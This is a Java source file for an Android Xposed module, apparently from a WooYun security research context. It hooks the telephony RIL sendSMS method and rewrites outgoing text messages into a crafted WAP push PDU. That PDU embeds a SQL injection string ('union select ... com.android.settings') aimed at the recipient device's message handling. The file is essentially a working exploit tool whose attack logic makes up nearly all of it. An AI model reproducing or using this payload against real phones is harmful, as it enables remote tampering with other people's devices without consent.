package org.wooyun.networkhook;

import android.content.Context;
import android.net.http.AndroidHttpClient;
import android.os.Message;
import android.util.Log;
import org.apache.http.HttpRequest;
import java.lang.reflect.Method;
import java.lang.reflect.Type;

import de.robv.android.xposed.*;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class Hook implements IXposedHookLoadPackage {
    private static final String TAG = "XmsInspector";
    private static final boolean REPLACE_INCOMING = false;
    private static final boolean REPLACE_OUTCOMING = true;

    @Override
    public void handleLoadPackage(LoadPackageParam loadPackageParam) throws Throwable {
        if (loadPackageParam.packageName.equalsIgnoreCase("com.android.phone")) {
            Log.i(TAG, String.format("Package %s loaded", loadPackageParam.packageName));

            // replace send sms method
            findAndHookMethod("com.android.internal.telephony.RIL", loadPackageParam.classLoader, "sendSMS", String.class, String.class, Message.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    // this will be called before the clock was updated by the original method
                    String smsc_str = (String)param.args[0];
                    String pdu_str = (String)param.args[1];

                    Log.i(TAG, String.format("Sent an message at RIL, pdu is: %s, smsc is: %s", pdu_str, smsc_str));

                    if (REPLACE_OUTCOMING) {
                        byte[] original_pdu = new byte[pdu_str.length() / 2];
                        for (int i = 0; i < pdu_str.length(); i += 2) {
                            original_pdu[i / 2] = (byte) Integer.parseInt(pdu_str.substring(i, i + 2), 16);
                        }

                        String payload_str = "800B05040B84C0020003F001010A065603B081EAAF2720756e696f6e2073656c65637420302c27636f6d2e616e64726f69642e73657474696e6773272c27636f6d2e616e64726f69642e73657474696e67732e53657474696e6773272c302c302c302d2d200002066A008509036D6F62696C65746964696E67732E636F6D2F0001";
                        byte[] payload = new byte[payload_str.length() / 2];
                        for (int i = 0; i < payload_str.length(); i += 2) {
                            payload[i / 2] = (byte) Integer.parseInt(payload_str.substring(i, i + 2), 16);
                        }

                        if (original_pdu.length > 4) {              // check
                            if (0x00 == original_pdu[1] &&
                                -127 == original_pdu[3]) {
                                int length = original_pdu[2];       // pdu head length
                                int end_offset = (length + 1) / 2;  // calc head end offset
                                if (0x00 == original_pdu[end_offset + 4] &&
                                    0x00 == original_pdu[end_offset + 5]) {
                                    int head_length = 4 + end_offset + 2;

                                    byte[] new_pdu = new byte[head_length + payload.length];
                                    System.arraycopy(original_pdu, 0, new_pdu, 0, head_length);
                                    new_pdu[0] = 0x41;
                                    new_pdu[head_length - 1] = 0x00;
                                    System.arraycopy(payload, 0, new_pdu, head_length, payload.length);

                                    pdu_str = "";
                                    for (byte aPdu : new_pdu) {
                                        pdu_str += String.format("%02x", aPdu);
                                    }

                                    param.args[1] = pdu_str;    // replace pdu string here

                                    Log.i(TAG, String.format("outcoming replacement done, new pdu: %s", pdu_str));
                                }
                            }
                        }
                    }
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                }
            });
    }
}
}
